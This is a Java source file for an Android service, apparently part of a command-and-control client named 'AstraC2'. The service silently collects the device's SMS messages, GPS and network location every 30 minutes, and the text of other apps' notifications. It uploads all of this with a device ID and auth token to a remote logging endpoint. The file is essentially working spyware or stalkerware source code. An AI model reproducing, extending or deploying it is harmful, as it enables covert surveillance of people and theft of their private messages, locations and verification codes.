package com.astra.c2client;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class LogCollectorService extends Service {
    private static final String TAG = "AstraC2-LogCollector";
    private static final int LOCATION_INTERVAL = 30 * 60 * 1000; // 30 minutes
    private static final float LOCATION_DISTANCE = 100.0f; // 100 meters

    private ScheduledExecutorService scheduler;
    private SharedPreferences sharedPreferences;
    private boolean isRunning = false;
    
    private LocationManager locationManager;
    private SmsObserver smsObserver;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "LogCollectorService created");
        scheduler = Executors.newSingleThreadScheduledExecutor();
        sharedPreferences = getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        // Initialize location services
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "LogCollectorService started");

        if (!isRunning) {
            startLogCollection();
            isRunning = true;
        }

        return START_STICKY;
    }

    private void startLogCollection() {
        // Initialize SMS observer
        if (smsObserver == null) {
            smsObserver = new SmsObserver(handler);
            getContentResolver().registerContentObserver(
                    Uri.parse("content://sms"), true, smsObserver);
            logToMain("SMS observer registered");
        }
        
        // Start location updates
        startLocationUpdates();
        
        // Schedule a periodic location check
        scheduler.scheduleAtFixedRate(
            this::checkAndSendLocation,
            15, // wait 15 seconds before first check
            LOCATION_INTERVAL / 1000,
            TimeUnit.SECONDS
        );
        
        logToMain("Log collection service started");
    }
    
    private void startLocationUpdates() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            logToMain("No location permissions granted");
            return;
        }

        try {
            // Register for location updates
            LocationListener locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocationUpdate(location);
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }

                @Override
                public void onProviderEnabled(String provider) {
                }

                @Override
                public void onProviderDisabled(String provider) {
                }
            };

            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        LOCATION_INTERVAL,
                        LOCATION_DISTANCE,
                        locationListener);
                logToMain("GPS location updates requested");
            }

            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        LOCATION_INTERVAL,
                        LOCATION_DISTANCE,
                        locationListener);
                logToMain("Network location updates requested");
            }
        } catch (Exception e) {
            logToMain("Error starting location updates: " + e.getMessage());
            Log.e(TAG, "Error starting location updates", e);
        }
    }
    
    private void checkAndSendLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            Location location = null;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                sendLocationUpdate(location);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking location", e);
        }
    }
    
    private void sendLocationUpdate(Location location) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("latitude", location.getLatitude());
            locationData.put("longitude", location.getLongitude());
            locationData.put("altitude", location.getAltitude());
            locationData.put("accuracy", location.getAccuracy());
            locationData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date(location.getTime())));
            locationData.put("provider", location.getProvider());
            
            // Send to server
            sendLog("gps", locationData.toString());
            
            Log.d(TAG, "Location update sent: " + locationData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating location JSON", e);
        }
    }
    
    private void sendSmsLog(String address, String body, long timestamp) {
        try {
            JSONObject smsData = new JSONObject();
            smsData.put("from", address);
            smsData.put("message", body);
            smsData.put("received_at", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date(timestamp)));
            
            // Send to server
            sendLog("sms", smsData.toString());
            
            Log.d(TAG, "SMS log sent: " + smsData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating SMS JSON", e);
        }
    }
    
    public static void sendNotificationLog(Context context, String packageName, String title, String text) {
        try {
            JSONObject notificationData = new JSONObject();
            notificationData.put("app", packageName);
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date()));
            
            // Get preferences and device info
            SharedPreferences prefs = context.getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
            String deviceId = prefs.getString(Config.PREF_DEVICE_ID, null);
            String authToken = prefs.getString(Config.PREF_AUTH_TOKEN, null);
            
            if (deviceId == null || authToken == null) {
                Log.e(TAG, "Device not registered, can't send notification log");
                return;
            }
            
            // Send to server
            Map<String, String> params = new HashMap<>();
            params.put("device_id", deviceId);
            params.put("auth_token", authToken);
            params.put("type", "notification");
            params.put("content", notificationData.toString());
            
            Executors.newSingleThreadExecutor().execute(() -> {
                try {
                    ApiClient.sendPostRequest(Config.ENDPOINT_SEND_LOG, params);
                    Log.d(TAG, "Notification log sent: " + notificationData.toString());
                } catch (IOException | JSONException e) {
                    Log.e(TAG, "Error sending notification log", e);
                }
            });
        } catch (JSONException e) {
            Log.e(TAG, "Error creating notification JSON", e);
        }
    }
    
    private void sendLog(String type, String content) {
        String deviceId = sharedPreferences.getString(Config.PREF_DEVICE_ID, null);
        String authToken = sharedPreferences.getString(Config.PREF_AUTH_TOKEN, null);
        
        if (deviceId == null || authToken == null) {
            Log.e(TAG, "Device not registered, can't send log");
            return;
        }
        
        Map<String, String> params = new HashMap<>();
        params.put("device_id", deviceId);
        params.put("auth_token", authToken);
        params.put("type", type);
        params.put("content", content);
        
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                ApiClient.sendPostRequest(Config.ENDPOINT_SEND_LOG, params);
            } catch (IOException | JSONException e) {
                Log.e(TAG, "Error sending log", e);
            }
        });
    }
    
    // Inner class to observe SMS
    private class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            onChange(selfChange, null);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            if (ActivityCompat.checkSelfPermission(LogCollectorService.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            // Get the latest SMS
            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 1");
            
            if (cursor != null && cursor.moveToFirst()) {
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                long timestamp = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                
                sendSmsLog(address, body, timestamp);
                cursor.close();
            }
        }
    }
    
    private void logToMain(String message) {
        Log.d(TAG, message);
        
        Intent intent = new Intent(Config.ACTION_LOG_MESSAGE);
        intent.putExtra(Config.EXTRA_LOG_MESSAGE, message);
        sendBroadcast(intent);
        
        // Update MainActivity log directly if it's in foreground
        if (MainActivity.isActive()) {
            MainActivity mainActivity = MainActivity.getInstance();
            if (mainActivity != null) {
                mainActivity.appendToLog(message);
            }
        }
    }

    @Override
    public void onDestroy() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
        
        // Unregister SMS observer
        if (smsObserver != null) {
            getContentResolver().unregisterContentObserver(smsObserver);
            smsObserver = null;
        }
        
        isRunning = false;
        logToMain("Log collector service stopped");
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    // Notification listener service
    public static class NotificationService extends NotificationListenerService {
        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            String packageName = sbn.getPackageName();
            
            // Skip system notifications
            if (packageName.startsWith("android") || packageName.equals(getPackageName())) {
                return;
            }
            
            if (sbn.getNotification().extras != null) {
                String title = sbn.getNotification().extras.getString("android.title", "");
                String text = sbn.getNotification().extras.getString("android.text", "");
                
                if (!title.isEmpty() || !text.isEmpty()) {
                    sendNotificationLog(getApplicationContext(), packageName, title, text);
                }
            }
        }
    }
}
